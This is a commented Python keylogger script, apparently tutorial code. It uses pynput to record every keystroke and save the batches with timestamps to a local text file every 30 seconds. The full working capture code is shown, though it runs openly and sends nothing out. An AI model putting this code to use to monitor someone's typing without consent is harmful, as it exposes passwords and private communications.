from pynput import keyboard #enables keyboard monitoring
import time #used to tell realtime

buffer = [] #gives us a scratchpad on primary memory to store keystrokes before saving to file
log_file = "keystrokes.txt" #the file we will create once 30 seconds have elapsed
last_save = time.time() #timestamp

def on_press(key): #keylogger function
    global last_save #this gets called on every key press event
    try:
        buffer.append(key.char) #adds the character to the buffer if it's a regular key
    except AttributeError:
        buffer.append(str(key).replace('Key.', '[') + ']') #if it's a special key, we format it between [ and ]
    
    if time.time() - last_save >= 30: #checks to see if 30 seconds have passed since the last save
        save_to_file() #triggers save file function
        last_save = time.time() #updates last_save to the current time

def save_to_file(): #save function
    if buffer: #this checks to see if the buffer is not empty before saving, we hate empty files
        with open(log_file, 'a', encoding='utf-8') as f: #opens our scratchpad file in append mode, with standard utf-8 encoding
            timestamp = time.strftime("%Y-%m-%d %H:%M:%S") #creates a timestamp in the format of Year-Month-Day Hour:Minute:Second
            f.write(f"\n[{timestamp}]\n") #writes the timestamp to the file before the keystrokes
            f.write(''.join(buffer)) #writes the contents of the buffer to the file
            f.write("\n" + "-"*50 + "\n") #separates each batch with a line of dashes
        buffer.clear() #clears the buffer after saving to prevent duplicate entries
        print(f"Saved keystrokes to {log_file}") #notifies us that the keystrokes have been saved to the file

print(f"Logging to {log_file} (saves every 30 seconds)...") #lets the user know that the program is running and in what file it is saving the keystrokes
with keyboard.Listener(on_press=on_press) as listener: #this sets up the listener to monitor key presses and call the on_press function
    listener.join() #prevents the program from exiting and keeps it running to listen for key presses